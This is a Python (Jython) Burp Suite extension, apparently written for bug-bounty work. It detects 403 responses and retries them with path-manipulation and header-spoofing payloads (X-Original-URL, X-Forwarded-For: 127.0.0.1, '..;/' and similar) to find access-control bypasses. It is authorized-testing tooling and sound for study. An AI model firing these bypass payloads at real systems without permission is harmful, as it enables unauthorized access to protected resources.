# -*- coding: utf-8 -*-
"""
4or3 — 403 Bypasser (Burp Suite Extension — Jython 2.7)

Author/Credits: Thayner Kesley
Links:
  - https://app.intigriti.com/researcher/profile/thaynerkesley
  - https://github.com/ThaynerKesley
  - https://www.linkedin.com/in/thayner/
Contact: thayner.contato@gmail.com

Notes:
  - Implements IBurpExtender + IScannerCheck + ITab.
  - Passive scan: when a 403 response is observed, runs a small set of
    safe path/header bypass variants and reports a single consolidated issue
    if any confirmed hit is detected.
  - Focus on low false-positives: compare status, body length delta, optional title
    and confirm N times.
  - Settings are persisted via saveExtensionSetting/loadExtensionSetting.

Tested with: Burp Suite Community/Pro, Jython 2.7.3 standalone.
"""

from burp import IBurpExtender, IScannerCheck, IScanIssue, ITab
from java.io import PrintWriter
from java.lang import System
from java.net import URL
from java.awt import BorderLayout, GridBagLayout, GridBagConstraints, Insets
from javax.swing import (
    JPanel, JLabel, JTextField, JCheckBox, JButton, JSpinner, SpinnerNumberModel,
    JOptionPane, JTextArea, JScrollPane
)
import re
import time

EXT_NAME = "4or3 — 403 Bypasser"

# keys for persistence
K_ENABLE = "4or3_enable"
K_ONLY_SCOPE = "4or3_only_scope"
K_HEADER_NAME = "4or3_hname"
K_HEADER_VALUE = "4or3_hvalue"
K_STATUS_ALLOW = "4or3_status_allow"
K_MIN_DELTA = "4or3_min_delta"
K_CONFIRM = "4or3_confirm"
K_TITLE_CHECK = "4or3_title_check"

DEFAULTS = {
    K_ENABLE: "true",
    K_ONLY_SCOPE: "true",
    K_HEADER_NAME: "X-Intigriti-Username",
    K_HEADER_VALUE: "thaynerkesley@intigriti.me",
    K_STATUS_ALLOW: "200,204,206,301,302,307,308",
    K_MIN_DELTA: "15",
    K_CONFIRM: "2",
    K_TITLE_CHECK: "false",
}

# header payloads (safe-first)
SAFE_HEADER_PAYLOADS = [
    ("X-Original-URL", "path"),
    ("X-Rewrite-URL", "path"),
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("Forwarded", "for=127.0.0.1;proto=https"),
]

EXTENDED_HEADER_PAYLOADS = [
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("X-Host", "127.0.0.1"),
    ("X-Forwarded-Host", "127.0.0.1"),
]

# path payloads (safe + a few extended)
SAFE_PATH_PAYLOADS = [
    "%2e/{last}",
    "{last}/.",
    "./{last}/./",
    "{last}%20/",
    "/{last}//",
    "{last}/",
]
EXT_PATH_PAYLOADS = [
    "%20{last}%20/",
    "{last}..;/",
    "{last}?",
    "{last}??",
    "{last}/.randomstring",
]


def _b(s):
    return ("%s" % s).lower() == "true"


def _split_path(path):
    if not path or path == "/":
        return "", ""
    p = path.rstrip("/")
    if "/" in p:
        base = p.rsplit("/", 1)[0]
        last = p.rsplit("/", 1)[1]
    else:
        base = ""
        last = p
    if base and not base.startswith("/"):
        base = "/" + base
    return base, last


def _title_from_body(body_str):
    # body_str is a Python str (decoded); we are lenient
    m = re.search(r"<title[^>]*>(.*?)</title>", body_str, re.I | re.S)
    if not m:
        return None
    return re.sub(r"\s+", " ", m.group(1)).strip()


class BurpExtender(IBurpExtender, IScannerCheck, ITab):

    # ==== Burp bootstrap ====
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName(EXT_NAME)

        self.stdout = PrintWriter(callbacks.getStdout(), True)
        self.stderr = PrintWriter(callbacks.getStderr(), True)

        # state
        self.state = {}
        for k, v in DEFAULTS.items():
            val = callbacks.loadExtensionSetting(k)
            self.state[k] = val if val is not None else v

        # ui
        self._build_ui()
        callbacks.addSuiteTab(self)

        # scanner
        callbacks.registerScannerCheck(self)

        self.stdout.println("%s loaded." % EXT_NAME)
        self.stdout.println("Tip: use Project Scope to limit domains.")

    # ==== UI ====
    def _build_ui(self):
        self.panel = JPanel(BorderLayout())
        form = JPanel(GridBagLayout())
        c = GridBagConstraints()
        c.insets = Insets(4, 4, 4, 4)
        c.anchor = GridBagConstraints.WEST
        c.fill = GridBagConstraints.HORIZONTAL
        c.weightx = 1.0

        row = 0
        # Enable
        self.chkEnable = JCheckBox("Enable", _b(self.state[K_ENABLE]))
        self._add(form, c, JLabel("Status:"), 0, row)
        self._add(form, c, self.chkEnable, 1, row); row += 1

        # Only in-scope
        self.chkOnlyScope = JCheckBox("Only in-scope", _b(self.state[K_ONLY_SCOPE]))
        self._add(form, c, JLabel("Scope:"), 0, row)
        self._add(form, c, self.chkOnlyScope, 1, row); row += 1

        # Header name/value (optional global header to always add)
        self.txtHName = JTextField(self.state[K_HEADER_NAME], 24)
        self._add(form, c, JLabel("Header Name:"), 0, row)
        self._add(form, c, self.txtHName, 1, row); row += 1

        self.txtHValue = JTextField(self.state[K_HEADER_VALUE], 24)
        self._add(form, c, JLabel("Header Value:"), 0, row)
        self._add(form, c, self.txtHValue, 1, row); row += 1

        # Status allow list
        self.txtStatusAllow = JTextField(self.state[K_STATUS_ALLOW], 24)
        self._add(form, c, JLabel("Allow statuses:"), 0, row)
        self._add(form, c, self.txtStatusAllow, 1, row); row += 1

        # Min delta percent
        try:
            min_delta_val = int(self.state[K_MIN_DELTA])
        except:
            min_delta_val = 15
        self.spnMinDelta = JSpinner(SpinnerNumberModel(min_delta_val, 0, 100, 1))
        self._add(form, c, JLabel("Min Δ% vs 403:"), 0, row)
        self._add(form, c, self.spnMinDelta, 1, row); row += 1

        # Confirm repeats
        try:
            confirm_val = int(self.state[K_CONFIRM])
        except:
            confirm_val = 2
        self.spnConfirm = JSpinner(SpinnerNumberModel(confirm_val, 1, 5, 1))
        self._add(form, c, JLabel("Confirm N:"), 0, row)
        self._add(form, c, self.spnConfirm, 1, row); row += 1

        # Title check
        self.chkTitle = JCheckBox("Title check", _b(self.state[K_TITLE_CHECK]))
        self._add(form, c, JLabel("Heuristics:"), 0, row)
        self._add(form, c, self.chkTitle, 1, row); row += 1

        # Save
        btnSave = JButton("Save", actionPerformed=self._on_save)
        self._add(form, c, JLabel(""), 0, row)
        self._add(form, c, btnSave, 1, row); row += 1

        # log area (read-only)
        self.txtLog = JTextArea(6, 80)
        self.txtLog.setEditable(False)
        self.panel.add(form, BorderLayout.NORTH)
        self.panel.add(JScrollPane(self.txtLog), BorderLayout.CENTER)

    def _add(self, panel, c, comp, x, y):
        c.gridx = x; c.gridy = y
        panel.add(comp, c)

    def _on_save(self, evt):
        self.state[K_ENABLE] = str(self.chkEnable.isSelected()).lower()
        self.state[K_ONLY_SCOPE] = str(self.chkOnlyScope.isSelected()).lower()
        self.state[K_HEADER_NAME] = self.txtHName.getText().strip()
        self.state[K_HEADER_VALUE] = self.txtHValue.getText().strip()
        self.state[K_STATUS_ALLOW] = self.txtStatusAllow.getText().strip()
        self.state[K_MIN_DELTA] = str(self.spnMinDelta.getValue())
        self.state[K_CONFIRM] = str(self.spnConfirm.getValue())
        self.state[K_TITLE_CHECK] = str(self.chkTitle.isSelected()).lower()
        for k, v in self.state.items():
            self._callbacks.saveExtensionSetting(k, v)
        JOptionPane.showMessageDialog(self.panel, "Saved!", EXT_NAME, JOptionPane.INFORMATION_MESSAGE)

    # ITab
    def getTabCaption(self):
        return EXT_NAME

    def getUiComponent(self):
        return self.panel

    # ==== Scanner ====
    def doPassiveScan(self, baseRequestResponse):
        try:
            if not _b(self.state[K_ENABLE]):
                return None

            reqinfo = self._helpers.analyzeRequest(baseRequestResponse)
            url = reqinfo.getUrl()

            if _b(self.state[K_ONLY_SCOPE]) and not self._callbacks.isInScope(url):
                return None

            resp_bytes = baseRequestResponse.getResponse()
            if not resp_bytes:
                return None

            st = self._helpers.analyzeResponse(resp_bytes).getStatusCode()
            if st != 403:
                return None

            path = url.getPath()
            base_path, last = _split_path(path)
            self._log("403 observed at: %s" % path)

            # Baseline (replay original request once)
            baseline_resp = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), baseRequestResponse.getRequest()
            )
            b_status = self._helpers.analyzeResponse(baseline_resp.getResponse()).getStatusCode()
            b_body = self._body_str(baseline_resp.getResponse())
            b_len = len(b_body)
            b_title = _title_from_body(b_body) if _b(self.state[K_TITLE_CHECK]) else None

            # Variant plan
            payloads = self._gen_path_payloads(base_path, last) + self._gen_header_payloads(path)

            allow = self._parse_status_allow(self.state[K_STATUS_ALLOW])
            min_delta = self._to_int(self.state[K_MIN_DELTA], 15)
            confirm_n = self._to_int(self.state[K_CONFIRM], 2)

            hits = []
            for kind, tgt_path, hdr_kv in payloads:
                new_req = self._mutate_request(baseRequestResponse.getRequest(), tgt_path, hdr_kv)
                ok, rinfo = self._probe_once(baseRequestResponse, new_req, allow, b_len, b_status, b_title, min_delta)
                if not ok:
                    continue
                # confirm N times
                confirmed = True
                for _ in range(confirm_n - 1):
                    ok2, _r2 = self._probe_once(baseRequestResponse, new_req, allow, b_len, b_status, b_title, min_delta)
                    if not ok2:
                        confirmed = False
                        break
                    time.sleep(0.05)

                if confirmed:
                    hits.append((kind, tgt_path, hdr_kv, rinfo))

            if not hits:
                return None

            # build issue text
            details = []
            for (kind, tgt_path, hdr_kv, rinfo) in hits:
                if kind == "path":
                    details.append("Path payload: %s | Status: %d | Δ: %.1f%%" % (tgt_path, rinfo["status"], rinfo["delta"]))
                else:
                    details.append("Header payload: %s: %s | Status: %d | Δ: %.1f%%" % (hdr_kv[0], hdr_kv[1], rinfo["status"], rinfo["delta"]))

            issue = CustomScanIssue(
                baseRequestResponse.getHttpService(),
                url,
                [self._callbacks.applyMarkers(baseRequestResponse, None, None)],
                "4or3 — 403 Bypass (confirmed)",
                "<br>".join(details),
                "High"
            )
            return [issue]

        except Exception as e:
            try:
                self.stderr.println("Error in doPassiveScan: %s" % str(e))
            except:
                pass
            return None

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        try:
            if existingIssue.getUrl() == newIssue.getUrl():
                return -1
        except:
            pass
        return 0

    # ==== Helpers ====
    def _parse_status_allow(self, s):
        out = []
        for part in ("%s" % s).split(','):
            part = part.strip()
            if not part:
                continue
            try:
                out.append(int(part))
            except:
                pass
        if not out:
            out = [200, 204, 206, 301, 302, 307, 308]
        return out

    def _to_int(self, s, dv):
        try:
            return int(s)
        except:
            return dv

    def _gen_path_payloads(self, base_path, last):
        if not last:
            return []
        plans = []
        for tpl in SAFE_PATH_PAYLOADS + EXT_PATH_PAYLOADS:
            p = tpl.format(last=last)
            if base_path:
                if base_path.endswith('/'):
                    fullp = base_path + p
                else:
                    fullp = base_path + '/' + p
            else:
                fullp = '/' + p.lstrip('/')
            plans.append(("path", fullp, None))
        return plans

    def _gen_header_payloads(self, original_path):
        plans = []
        all_headers = SAFE_HEADER_PAYLOADS + EXTENDED_HEADER_PAYLOADS
        for (k, v) in all_headers:
            if k == "X-Original-URL":
                new_path = original_path.rstrip('/') + "4nyth1ng"
                plans.append(("header", new_path, (k, original_path)))
            elif k == "X-Rewrite-URL":
                plans.append(("header", '/', (k, original_path)))
            else:
                plans.append(("header", None, (k, v)))
        return plans

    def _mutate_request(self, req_bytes, new_path, header_kv):
        # returns new request bytes after changing path and/or headers
        req = self._helpers.bytesToString(req_bytes)
        info = self._helpers.analyzeRequest(req_bytes)
        headers = list(info.getHeaders())
        body = req_bytes[info.getBodyOffset():]

        # 1) request line path swap
        if new_path is not None:
            # e.g., "GET /old HTTP/1.1" -> replace middle token with new_path
            if headers:
                first = headers[0]
                m = re.match(r"^(\S+)\s+(\S+)\s+(HTTP/\d\.\d)$", first)
                if m:
                    method = m.group(1)
                    proto = m.group(3)
                    headers[0] = "%s %s %s" % (method, new_path, proto)

        # 2) always-add global header if set
        gname = self.state[K_HEADER_NAME].strip()
        gval = self.state[K_HEADER_VALUE].strip()
        if gname and gval:
            headers = self._add_or_replace_header(headers, gname, gval)

        # 3) specific payload header
        if header_kv is not None:
            k, v = header_kv
            if k.lower() == "referer":
                headers = self._add_or_replace_header(headers, k, v)
            else:
                headers.append("%s: %s" % (k, v))

        return self._helpers.buildHttpMessage(headers, body)

    def _add_or_replace_header(self, headers, name, value):
        out = []
        lower = name.lower()
        found = False
        for h in headers:
            if h.lower().startswith(lower + ":"):
                out.append("%s: %s" % (name, value))
                found = True
            else:
                out.append(h)
        if not found:
            out.append("%s: %s" % (name, value))
        return out

    def _probe_once(self, baseRR, req_bytes, allow, baseline_len, baseline_status, baseline_title, min_delta):
        r = self._callbacks.makeHttpRequest(baseRR.getHttpService(), req_bytes)
        resp = r.getResponse()
        if resp is None:
            return False, None
        st = self._helpers.analyzeResponse(resp).getStatusCode()
        body_str = self._body_str(resp)
        length = len(body_str)
        delta_pct = abs(length - baseline_len) * 100.0 / float(max(baseline_len, 1))
        title = _title_from_body(body_str) if _b(self.state[K_TITLE_CHECK]) else None

        status_ok = st in allow
        title_ok = True
        if _b(self.state[K_TITLE_CHECK]):
            title_ok = ("%s" % (baseline_title or "")) != ("%s" % (title or ""))

        ok = status_ok and ((delta_pct >= min_delta) or (st != baseline_status) or title_ok)
        info = {"status": st, "len": length, "delta": delta_pct}
        return ok, info

    def _body_str(self, resp_bytes):
        try:
            body = resp_bytes[self._helpers.analyzeResponse(resp_bytes).getBodyOffset():]
            return self._helpers.bytesToString(body)
        except:
            return ""

    def _log(self, s):
        try:
            self.txtLog.append(s + "\n")
        except:
            pass
        try:
            self.stdout.println(s)
        except:
            pass


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService